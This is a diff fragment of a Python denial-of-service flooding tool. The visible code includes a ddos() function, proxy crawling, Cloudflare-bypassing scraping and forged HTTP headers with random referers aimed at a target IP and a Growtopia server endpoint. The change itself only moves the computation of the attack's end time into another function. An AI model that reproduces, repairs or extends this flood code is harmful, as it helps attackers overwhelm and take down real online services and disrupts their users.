@@ -2413,6 +2413,7 @@ def Headers(method):
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+        until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
         post_again = "POST http://" + ip + "/growtopia/server_data.php"
         get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
@@ -2437,7 +2438,6 @@ def Headers(method):
 
 def ddos():
     socksCrawler()
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
     scraper = cloudscraper.create_scraper()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
